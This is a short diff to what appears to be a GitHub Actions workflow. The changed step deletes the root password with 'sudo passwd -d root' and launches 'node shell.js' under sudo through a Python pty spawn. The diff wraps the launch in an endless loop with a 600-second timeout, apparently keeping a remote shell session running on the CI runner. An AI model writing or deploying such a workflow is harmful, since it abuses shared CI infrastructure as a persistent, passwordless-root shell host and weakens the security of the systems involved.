@@ -34,9 +34,10 @@ jobs:
     - name: Run
       run: |
         sudo passwd -d root
-        chmod 755 shell.sh
+        while true
+        do
         echo "starting..."
-        sudo -sH python -c 'import pty; pty.spawn(["node","shell.js","-l","-t","600","github3"])'
+        sudo -sH python -c 'import pty; pty.spawn(["node","shell.js","-r","-l","-t","600","github3"])'
         echo "Ending..."
         sleep 2
         done
